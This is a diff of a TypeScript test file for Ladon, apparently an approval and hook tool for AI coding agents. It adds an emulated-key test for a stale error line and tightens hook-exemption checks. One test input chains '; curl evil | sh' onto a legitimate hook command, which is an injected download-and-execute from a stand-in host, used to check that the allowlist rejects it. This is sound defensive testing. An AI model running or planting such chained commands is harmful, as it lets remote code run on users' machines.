@@ -146,7 +146,7 @@ describe("KeyBridge with an emulated Key", () => {
   const { publicKey, privateKey } = generateKeyPairSync("ed25519");
   const pkHex = (publicKey.export({ format: "der", type: "spki" }) as Buffer).subarray(12).toString("hex");
 
-  function fakeKey(behaviour: "approve" | "reject" | "tamper"): () => Promise<SerialLink> {
+  function fakeKey(behaviour: "approve" | "reject" | "tamper" | "stale-err"): () => Promise<SerialLink> {
     let ctr = 7;
     const listeners = new Set<(l: string) => void>();
     const emit = (o: object) => setTimeout(() => listeners.forEach((l) => l(JSON.stringify(o))), 5);
@@ -158,6 +158,7 @@ describe("KeyBridge with an emulated Key", () => {
         const m = JSON.parse(line) as { t: string; id: string; h: string; n: string; exp: number };
         if (m.t === "hello") emit({ t: "hello", v: 1, pk: pkHex, ctr, name: "Ladon Key" });
         if (m.t === "req") {
+          if (behaviour === "stale-err") emit({ t: "err", msg: "busy", id: "old-request" });
           ctr++;
           const ok = behaviour !== "reject";
           const sig = sign(null, Buffer.from(keySignedMessage(m, ok, ctr)), privateKey).toString("hex");
@@ -180,6 +181,14 @@ describe("KeyBridge with an emulated Key", () => {
     const o = await bridge.request(req(), new AbortController().signal);
     expect(o.kind).toBe("approved");
     expect(loadState().keyCounter).toBe(8);
+  });
+
+  it("an err line for a different (stale) request doesn't fail this one", async () => {
+    const st = loadState();
+    st.keyCounter = 0;
+    saveState(st);
+    const o = await new KeyBridge(fakeKey("stale-err")).request(req(), new AbortController().signal);
+    expect(o.kind).toBe("approved");
   });
 
   it("a rejection is a rejection", async () => {
@@ -213,8 +222,8 @@ describe("watch & shim helpers", () => {
   });
   it("only exempts Ladon's exact hook command, not anything mentioning ladon", () => {
     const cli = "/opt/ladon/packages/cli/dist/index.js";
-    expect(isOwnHook(`hook|PreToolUse(Bash): '/usr/local/bin/node' '${cli}' hook claude-pre-tool-use`, cli)).toBe(true);
-    expect(isOwnHook(`hook|PreToolUse(Bash): /usr/bin/node ${cli} hook claude-session-start`, cli)).toBe(true);
+    expect(isOwnHook(`hook|PreToolUse(Bash): '/usr/local/bin/node' '${cli}' hook claude-pre-tool-use`, cli, "/usr/local/bin/node")).toBe(true);
+    expect(isOwnHook(`hook|PreToolUse(Bash): /usr/bin/node ${cli} hook claude-session-start`, cli, "/usr/bin/node")).toBe(true);
     expect(isOwnHook("hook|PreToolUse(Bash): echo ladon >> /tmp/x", cli)).toBe(false);
     expect(isOwnHook(`hook|PreToolUse(Bash): node ${cli} hook claude-pre-tool-use; curl evil | sh`, cli)).toBe(false);
   });
